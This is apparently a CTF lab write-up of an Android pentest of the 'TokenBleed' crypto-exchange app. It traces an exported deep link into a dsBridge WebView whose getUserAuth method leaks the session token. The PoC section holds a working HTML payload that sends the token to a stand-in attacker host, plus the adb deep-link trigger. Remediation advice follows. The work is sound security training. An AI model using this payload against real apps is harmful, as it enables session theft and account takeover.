# Mobile App Pentest — `com.mobilehackinglab.exchange` ("TokenBleed" / Cex)

**Target:** `mhl-lab-tokenbleed.apk` (package `com.mobilehackinglab.exchange`) — Mobile Hacking Lab
"TokenBleed" challenge (a crypto-exchange app, "Cex")
**Platform:** Android (minSdk 26, targetSdk 35)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** **Dynamically confirmed on-device.** The deep link
`mhlcrypto://showPage?url=https://<pages-host>/steal.html` was fired on the emulator against a
GitHub Pages–hosted PoC; the app loaded the attacker page into the dsBridge WebView, the page's
`dsBridge.call("getUserAuth", …)` returned the user's session token, and that token was rendered in
the attacker-controlled page — a third-party web origin reading the account's auth material, i.e.
the token bleed. The chain (exported deep link → unvalidated URL → dsBridge WebView → `getUserAuth`)
is deterministic and unconditional.

---

## Summary

Cex stores the user's authentication token **securely at rest** — `TokenManager` uses
`EncryptedSharedPreferences` (AES256-SIV/GCM, `MasterKeys`), the app is `allowBackup="false"` and
`usesCleartextTraffic="false"`. None of that matters, because the app **hands the token to arbitrary
web content** through a JavaScript bridge reachable from an attacker-supplied URL:

1. **Exported `SplashActivity`** registers a `mhlcrypto://` `BROWSABLE` deep link and forwards the
   link's data to `MainActivity` (when a token exists, i.e. the victim is logged in).
2. **`MainActivity.handleIntent()`** takes `mhlcrypto://showPage?url=<URL>` and opens
   `DWebViewActivity` with `url_to_load = <URL>` — **any `http(s)` URL, no domain allow-list**.
3. **`DWebViewActivity`** loads that URL into a **dsBridge** WebView and registers a native bridge
   object: `dwebview.addJavascriptObject(new JsApi(this), null)`.
4. **`JsApi.getUserAuth`** (a dsBridge `@JavascriptInterface` method) returns the **full session
   token** to whatever page is loaded.

So an attacker who gets a logged-in victim to open
`mhlcrypto://showPage?url=https://attacker.tld/steal.html` has their page call `getUserAuth`,
receive the JWT/session token, and exfiltrate it → **account takeover of the exchange account**.
That is the "bleed": a correctly-sealed token leaked through the bridge.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| TB-01 | Session-token disclosure to arbitrary web origin — dsBridge `JsApi.getUserAuth` returns the user's auth token to any loaded page → token theft / account takeover — **confirmed on-device** | **Critical** | MASVS-PLATFORM-2 / MASVS-AUTH-1 |
| TB-02 | Unvalidated deep-link URL loaded into the bridged WebView — `mhlcrypto://showPage?url=<any http(s)>` via exported `SplashActivity` → `MainActivity` → `DWebViewActivity`; no origin/domain allow-list | **High** | MASVS-PLATFORM-1 / MASVS-CODE-4 |
| TB-03 | dsBridge object exposed to all origins; `JsApi.openNewWindow` lets a loaded page open further bridged WebViews to any `http(s)` URL (pivot/persistence) | High | MASVS-PLATFORM-2 |

**Done right (not vulnerable):** token at rest (`EncryptedSharedPreferences`), `allowBackup="false"`,
`usesCleartextTraffic="false"`. The weakness is exposure of the token through the WebView bridge, not
its storage.

---

## TB-02 — Attacker controls the URL loaded into the bridge WebView

**Manifest** — `SplashActivity` is exported with the deep link:
```xml
<activity android:name=".SplashActivity" android:exported="true">
    <intent-filter> <!-- LAUNCHER --> </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="mhlcrypto"/>
    </intent-filter>
</activity>
```
`SplashActivity` forwards the deep link to `MainActivity` when logged in:
```java
if (new TokenManager(applicationContext).getToken() != null) {
    intent = new Intent(this, MainActivity.class);
    intent.setData(getIntent().getData());        // carries mhlcrypto://… through
    intent.setAction(getIntent().getAction());
}
```
`MainActivity.handleIntent()` loads whatever `url` the link supplies — only a scheme/host check, **no
validation of the URL itself**:
```java
if (action == VIEW && data.getScheme().equals("mhlcrypto") && data.getHost().equals("showPage")) {
    String queryParameter = data.getQueryParameter("url");
    Intent intent2 = new Intent(this, DWebViewActivity.class);
    intent2.putExtra("url_to_load", queryParameter);   // attacker-controlled
    startActivity(intent2);
}
```
`DWebViewActivity` loads it as long as it starts with `http`:
```java
String stringExtra = getIntent().getStringExtra("url_to_load");
...
dwebview.addJavascriptObject(new JsApi(this), null);          // bridge bound FIRST
if (stringExtra != null && stringExtra.startsWith("http")) dwebview.loadUrl(stringExtra);
```
There is no allow-list of trusted hosts, so `https://attacker.tld/...` is loaded into a WebView that
already has the native bridge attached.

## TB-01 — The bridge bleeds the token (the RCE-equivalent: full ATO)

```java
// JsApi (dsBridge @JavascriptInterface)
@JavascriptInterface
public void getUserAuth(Object args, CompletionHandler<Object> handler) {
    String token = new TokenManager(this.context).getToken();        // the real session token
    if (token != null) handler.complete(new JSONObject(token));      // -> returned to the web page
    else handler.complete(new JSONObject().put("error", "No token found"));
}
```
dsBridge exposes this to **any** page in the WebView with no origin restriction. The returned token
is the account's authentication material (a JWT — `JwtParser` decodes `name`/`email`/`tier` claims
and the app authenticates to `https://mhl-cex-auth-worker.…workers.dev` with it), so stealing it is
account takeover.

`JsApi.openNewWindow` compounds it — a loaded page can spawn further bridged `DWebViewActivity`
windows to any `http(s)` URL, extending reach/persistence.

### PoC
Attacker page `steal.html` (hosted anywhere the device can reach — e.g. the dev host via
`http://10.0.2.2:8000/` on an emulator, or a `workers.dev`-style URL):
```html
<!-- dsBridge client shim (wendu/dsbridge) -->
<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js"></script>
<script>
  dsBridge.call("getUserAuth", function (res) {
    // res is the user's auth token JSON — exfiltrate it
    new Image().src = "https://attacker.tld/collect?t=" + encodeURIComponent(JSON.stringify(res));
  });
</script>
```
(If you don't want the CDN shim, dsBridge's async call can be issued directly against the injected
`_dsbridge` interface; the shim is just the clean way.)

Deliver the deep link to a **logged-in** victim (any app / browser / `adb` can fire it):
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "mhlcrypto://showPage?url=https://attacker.tld/steal.html"
```
**Result (confirmed on-device):** the app opened the GitHub Pages–hosted `steal.html` in the dsBridge
WebView, the page's `getUserAuth` call returned the victim's session token, and the token was
displayed in the attacker-controlled page (a beacon to a collector such as `webhook.site` captures it
off-device just as easily) — logging in as the victim on the exchange with no further interaction.

---

## Root cause & remediation
- **Never expose auth material to web content.** A JS bridge reachable by loaded pages must not
  return tokens/credentials. Remove `getUserAuth`, or gate it so it is only callable from the app's
  own first-party, integrity-checked pages.
- **Allow-list the WebView origin.** Only load trusted, app-owned HTTPS hosts into a bridged WebView;
  reject deep-link-supplied URLs (or strip the bridge for untrusted origins). Validate the full URL,
  not just the `http` prefix.
- **Scope / authenticate the dsBridge.** dsBridge should expose methods only to a known origin; add
  an origin check in each `@JavascriptInterface` method, and don't let `openNewWindow` load arbitrary
  URLs into another bridged window.
- **Minimize the deep-link surface.** `mhlcrypto://showPage?url=` is an open redirect into the app's
  privileged WebView — constrain it to internal destinations.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (decompile + manifest decode); exploitation reproduced by the user on an
  Android emulator — deep link → GitHub Pages–hosted PoC page → `getUserAuth` returned the session
  token to the attacker page. dsBridge = `wendu.dsbridge` over a Tencent TBS (`com.tencent.smtt`)
  WebView; JWT via `com.auth0.jwt`; networking via OkHttp to
  `https://mhl-cex-auth-worker.arnotstacc.workers.dev`. GitHub Pages works as the attacker origin
  because it is HTTPS (`usesCleartextTraffic="false"` blocks plain-`http` hosts).
- App classes: `SplashActivity` (exported deep-link entry, forwards to Main), `MainActivity`
  (`handleIntent` → `DWebViewActivity` with the attacker URL), `DWebViewActivity` (dsBridge WebView,
  binds `JsApi`), `JsApi` (`getUserAuth` token-bleed + `openNewWindow`), `TokenManager`
  (EncryptedSharedPreferences — secure storage), `JwtParser`/`UserProfile`, `LoginActivity`.
